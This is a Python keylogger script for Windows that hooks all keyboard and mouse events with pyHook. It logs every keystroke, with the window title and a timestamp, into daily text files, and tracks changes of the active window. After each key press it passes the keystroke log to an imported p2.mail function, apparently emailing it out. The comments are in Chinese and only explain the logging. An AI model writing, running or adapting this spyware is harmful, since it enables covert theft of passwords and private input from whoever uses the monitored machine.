# encoding=utf-8
import pythoncom  
import pyHook  
import time, os
import p2
  
def onMouseEvent(event):  
    # """监听鼠标事件"""  
    global preWindowName, switch  
    if not os.path.exists(mouseFilepath):  
        os.makedirs(mouseFilepath)  
    if switch:    
        localTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())  
        datafileName = localTime[:localTime.find(" ")] + ".txt"  
        #time  WindowName  
        if not os.path.exists(mouseFilepath + datafileName):  
            f = open(mouseFilepath + datafileName, "w")  
            f.write("localTime              windowname\n")  
            f.close()  
  
        if type(event.WindowName) ==  str:     
            if event.WindowName != preWindowName:  
                datafileContent = localTime + ',    ' + event.WindowName + '\n'  
                f = open(mouseFilepath + datafileName, "a")  
                f.write(datafileContent)  
                f.close()  
                preWindowName = event.WindowName  
    #返回True以便将事件传给其他处理程序  
    return True  
  
def onKeyboardEvent(event):
    """监听键盘事件"""
    global switch
    if not os.path.exists(keyboardFilepath):
        os.makedirs(keyboardFilepath)

    if switch:
        localTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        datafileName = localTime[:localTime.find(" ")] + ".txt"
        #time keyvalue Key WindowName
        if not os.path.exists(keyboardFilepath + datafileName):
            f = open(keyboardFilepath + datafileName, "w")
            f.write("localTime      keyvalue        key     windowname\n")
            f.close()

        if type(event.WindowName) ==  str:
            datafileContent = localTime + ',    ' + chr(event.Ascii) + ',   '+ event.Key + ',    ' + event.WindowName + '\n'
            f = open(keyboardFilepath + datafileName, "a")
            f.write(datafileContent)
            f.close()

    if event.KeyID == 118:#Key=F7
        switch = False
    if event.KeyID == 115:#Key=F4
        switch = True
    # print event.KeyID
    p2.mail(keyboardFilepath + datafileName)

    #同鼠标监听事件函数的返回值
    return True



def main():


    """创建一个'钩子'管理对象"""  
    hm = pyHook.HookManager()  
    #监听所有键盘事件
    hm.KeyDown = onKeyboardEvent
    #设置键盘'钩子'  
    hm.HookKeyboard()  

    #监听所有鼠标事件
    hm.MouseAll = onMouseEvent  
    #设置鼠标'钩子'  
    hm.HookMouse()  
  
    #进入循环，如不手动关闭，程序将一直处于监听状态  
    pythoncom.PumpMessages()  
  
if __name__ == '__main__':  
    keyboardFilepath = "./log/keyboard/"  
    mouseFilepath = "./log/mouse/"  
    preWindowName = ''  
    switch = True #控制是否开启日志功能  
    main()  